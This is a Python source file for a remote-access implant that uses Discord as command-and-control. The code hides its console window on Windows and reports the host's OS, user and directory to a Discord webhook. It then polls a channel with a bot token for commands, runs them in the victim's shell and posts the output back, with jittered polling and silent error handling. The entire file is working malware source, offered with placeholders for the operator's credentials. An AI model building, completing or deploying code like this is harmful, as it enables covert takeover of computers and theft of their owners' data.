import socket
import subprocess
import requests
import sys
import os
import time
import uuid
import random

DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE" 
DISCORD_C2_CHANNEL_ID_FOR_POLLING = "YOUR_DISCORD_C2_CHANNEL_ID_HERE"
DISCORD_BOT_TOKEN_FOR_POLLING = "YOUR_DISCORD_BOT_TOKEN_HERE" 

CLIENT_ID = str(uuid.uuid4())
SESSION_SHELL_INFO_SENT = False
POLLING_INTERVAL = 15 
LAST_POLLED_MESSAGE_ID = None

if sys.platform == "win32":
    import ctypes
    user32 = ctypes.windll.user32
    kernel32 = ctypes.windll.kernel32
    hwnd = kernel32.GetConsoleWindow()
else:
    user32 = None
    kernel32 = None
    hwnd = None

def execute_command(command_str):
    global SESSION_SHELL_INFO_SENT
    command_parts = command_str.strip().split()
    output_str = ""
    shell_info_message_to_prepend = ""

    if not command_str.strip():
        return "\n[Empty command received]\n"

    if command_parts[0].lower() == "cd":
        if len(command_parts) > 1:
            target_dir = " ".join(command_parts[1:])
            try:
                os.chdir(target_dir)
                output_str = f"[CWD] {os.getcwd()}\n"
            except FileNotFoundError:
                output_str = f"[Error] cd: No such file or directory: {target_dir}\n"
            except Exception as e:
                output_str = f"[Error] cd: {e}\n"
        else:
            try:
                home_dir = os.path.expanduser('~')
                os.chdir(home_dir)
                output_str = f"[CWD] {os.getcwd()}\n"
            except Exception as e:
                output_str = f"[Error] cd to home: {e}\n"
        return output_str

    shells_to_try = []
    if sys.platform != "win32":
        user_shell_env = os.environ.get("SHELL")
        if user_shell_env and os.path.basename(user_shell_env) in ["bash", "zsh", "fish", "ksh"]:
            shells_to_try.append(user_shell_env)
        shells_to_try.extend(["/bin/bash", "/bin/zsh", "/bin/sh"])
        unique_shells = []
        for shell in shells_to_try:
            if shell not in unique_shells:
                unique_shells.append(shell)
        shells_to_try = unique_shells
    else:
        shells_to_try.append(None)

    executed_successfully = False
    for shell_path_or_true in shells_to_try:
        current_run_output = ""
        try:
            if sys.platform == "win32":
                args = command_str
                use_shell_param = True
            elif shell_path_or_true:
                args = [shell_path_or_true, "-c", command_str]
                use_shell_param = False
            else:
                continue

            result = subprocess.run(args, shell=use_shell_param, capture_output=True, text=True, cwd=os.getcwd(), timeout=60)
            
            if result.stdout:
                current_run_output += result.stdout
            if result.stderr:
                current_run_output += f"[STDERR] {result.stderr}"
            
            if not current_run_output.strip() and result.returncode == 0 :
                 current_run_output = "\n" 
            elif result.returncode != 0 and not current_run_output.strip():
                current_run_output = f"\n[Command failed with code {result.returncode} via {shell_path_or_true or 'default shell'}]\n"
            
            if not SESSION_SHELL_INFO_SENT and shell_path_or_true and sys.platform != "win32" and shell_path_or_true != "/bin/sh":
                 shell_info_message_to_prepend = f"[Using shell: {os.path.basename(shell_path_or_true)} for commands]\n"
                 SESSION_SHELL_INFO_SENT = True 
            
            output_str = shell_info_message_to_prepend + current_run_output
            executed_successfully = True
            break
        except subprocess.TimeoutExpired:
            output_str = f"[Error] Command timed out (tried with {shell_path_or_true or 'default shell'}).\n"
            executed_successfully = True
            break
        except FileNotFoundError:
            if shell_path_or_true and sys.platform != "win32":
                continue 
            else:
                output_str = f"[Error] Default shell not found or 'cmd.exe' missing.\n"
                break 
        except Exception as e:
            output_str = f"[Error executing with {shell_path_or_true or 'default shell'}] {e}\n"
            break 

    if not executed_successfully and not output_str:
        output_str = "[Error] Command execution failed with all attempted shells.\n"
    
    if executed_successfully and not output_str.strip() and output_str != "\n":
        output_str = "\n"

    return output_str

def send_discord_message(content, is_checkin=False):
    if not DISCORD_WEBHOOK_URL:
        return

    max_len = 1950 
    prefix = f"CHECKIN:{CLIENT_ID}:" if is_checkin else f"OUTPUT:{CLIENT_ID}:"
    
    remaining_len_for_payload = max_len - len(prefix) - len("\n```\n\n```") 
    
    payload_content = content
    if not is_checkin: 
        payload_content = f"\n```\n{content}\n```"

    full_message_content = prefix + payload_content
    
    chunks = []
    if len(full_message_content) > 2000: 
        available_space = 2000 - len(prefix) - (len("\n```\n\n```") if not is_checkin else 0)
        truncated_content = content[:available_space-20] + "... (truncated)"
        if not is_checkin:
            payload_content = f"\n```\n{truncated_content}\n```"
        else:
            payload_content = truncated_content
        full_message_content = prefix + payload_content
        chunks.append(full_message_content)
    else:
        chunks.append(full_message_content)

    for chunk_data in chunks:
        data = {
            "content": chunk_data,
            "username": f"Implant-{CLIENT_ID[:8]}"
        }
        try:
            response = requests.post(DISCORD_WEBHOOK_URL, json=data, timeout=10)
            response.raise_for_status()
        except requests.exceptions.RequestException:
            pass 
        time.sleep(0.5) 

def poll_for_commands_discord():
    global LAST_POLLED_MESSAGE_ID
    if not DISCORD_C2_CHANNEL_ID_FOR_POLLING or not DISCORD_BOT_TOKEN_FOR_POLLING:
        return None

    headers = {"Authorization": f"Bot {DISCORD_BOT_TOKEN_FOR_POLLING}"}
    params = {"limit": 10} 
    if LAST_POLLED_MESSAGE_ID:
        params["after"] = LAST_POLLED_MESSAGE_ID
    
    url = f"https://discord.com/api/v9/channels/{DISCORD_C2_CHANNEL_ID_FOR_POLLING}/messages"
    
    try:
        response = requests.get(url, headers=headers, params=params, timeout=15)
        response.raise_for_status()
        messages = response.json()

        if not messages:
            return None
        
        newest_message_id_in_batch = messages[0]['id'] 

        command_to_execute = None
        
        for msg_data in reversed(messages): 
            current_message_id = msg_data['id']
            if LAST_POLLED_MESSAGE_ID is None or int(current_message_id) > int(LAST_POLLED_MESSAGE_ID):
                 pass

            content = msg_data.get("content", "")
            parts = content.split(":", 2)
            if len(parts) == 3 and parts[0].upper() == "CMD" and parts[1] == CLIENT_ID:
                command_text = parts[2]
                if LAST_POLLED_MESSAGE_ID is None or int(msg_data['id']) > int(LAST_POLLED_MESSAGE_ID):
                    command_to_execute = command_text 
        
        if messages:
            LAST_POLLED_MESSAGE_ID = messages[0]['id']

        return command_to_execute

    except requests.exceptions.RequestException:
        return None
    except Exception: 
        return None

def start_client_discord():
    global SESSION_SHELL_INFO_SENT, LAST_POLLED_MESSAGE_ID
    
    if sys.platform == "win32" and hwnd: 
        ctypes.windll.user32.ShowWindow(hwnd, 0)

    os_info = f"{sys.platform} - {os.name}"
    try:
        username = os.getlogin()
    except Exception:
        username = "UnknownUser"
    checkin_data = f"OS: {os_info}, User: {username}, CWD: {os.getcwd()}"
    send_discord_message(checkin_data, is_checkin=True)
    
    SESSION_SHELL_INFO_SENT = False 
    
    while True:
        command = poll_for_commands_discord()

        if command:
            if command.lower() == "exit":
                send_discord_message(f"Client {CLIENT_ID} shutting down by remote command.")
                break
            
            response_data = ""
            if command.lower() == "getip":
                try:
                    ip_response = requests.get("https://api64.ipify.org?format=json", timeout=5)
                    ip_response.raise_for_status()
                    ip = ip_response.json()["ip"]
                    response_data = f"[IP] {ip}\n"
                except requests.exceptions.RequestException as e_ip:
                    response_data = f"[Error] Getting IP: {e_ip}\n"
                except Exception as e_json:
                    response_data = f"[Error] Parsing IP response: {e_json}\n"
            elif command.lower() == "getwd":
                try:
                    response_data = f"[CWD] {os.getcwd()}\n"
                except Exception as e_cwd:
                    response_data = f"[Error] getwd: {e_cwd}\n"
            else:
                response_data = execute_command(command)
            
            send_discord_message(response_data)
        
        actual_polling_interval = POLLING_INTERVAL + random.uniform(-POLLING_INTERVAL * 0.2, POLLING_INTERVAL * 0.2)
        time.sleep(max(5, actual_polling_interval)) 

if __name__ == "__main__":
    DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL_FOR_CLIENT", DISCORD_WEBHOOK_URL)
    DISCORD_C2_CHANNEL_ID_FOR_POLLING = os.getenv("DISCORD_C2_CHANNEL_ID_FOR_CLIENT_POLLING", DISCORD_C2_CHANNEL_ID_FOR_POLLING)
    DISCORD_BOT_TOKEN_FOR_POLLING = os.getenv("DISCORD_BOT_TOKEN_FOR_CLIENT_POLLING", DISCORD_BOT_TOKEN_FOR_POLLING)

    if DISCORD_WEBHOOK_URL == "YOUR_DISCORD_WEBHOOK_URL_HERE" or \
       DISCORD_C2_CHANNEL_ID_FOR_POLLING == "YOUR_DISCORD_C2_CHANNEL_ID_HERE" or \
       DISCORD_BOT_TOKEN_FOR_POLLING == "YOUR_DISCORD_BOT_TOKEN_HERE":
        sys.exit(1)
            
    start_client_discord()

